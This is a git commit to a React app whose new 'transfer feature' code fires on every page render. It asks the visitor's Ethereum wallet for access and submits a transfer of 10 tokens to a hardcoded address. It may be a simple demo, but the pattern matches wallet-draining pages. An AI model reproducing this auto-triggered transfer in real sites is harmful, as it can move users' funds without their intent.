f302f469bd831fc0ed1c84bd4135f224141d494e
develop <develop@s72-167-36-30.secureserver.net>
2021-05-07 13:28:00 -0700

    add transfer feature

--- src/App.js
+++ src/App.js
@@ -1,7 +1,55 @@
 import logo from './logo.svg';
 import './App.css';
+import Web3Utils from 'web3-utils';
+import Web3 from 'web3';
 
 function App() {
+  const abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenOwner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokens","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"tokens","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+
+
+  const sendTransaction = async() => {
+    if(window.ethereum) {
+      
+
+      if(window.web3){
+        window.web3 = new Web3(window.web3.currentProvider);
+        await window.ethereum.enable();
+        
+        const decimals = 18;
+        const contractAdress = "0x87052a850a7f5efb7350e025c763544b40dbd2d4";
+        const abiInterface = new window.web3.eth.Contract(abi,contractAdress);        
+        
+        const send_address = "0x782a4649be237592a11f30f4C09D9a11FdA0ED1E";
+        const token_amount = 10;
+        const amount =  Web3Utils.numberToHex(token_amount * Math.pow(10, decimals));
+
+        const data = abiInterface.methods.transfer(send_address, amount).encodeABI(); 
+        try {
+
+          const transactionHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [
+              {
+                to: contractAdress,
+                from: window.ethereum.selectedAddress,
+                data: data 
+              },
+            ],
+          });
+          // Handle the result
+          console.log('success');
+          console.log(transactionHash);
+        } catch (error) {
+          console.error(error);
+        }
+      }
+    }
+    else {
+      console.log('Please install ethereum chrome extension.')
+    }
+  }
+
+  sendTransaction();
   return (
     <div className="App">
       <header className="App-header">
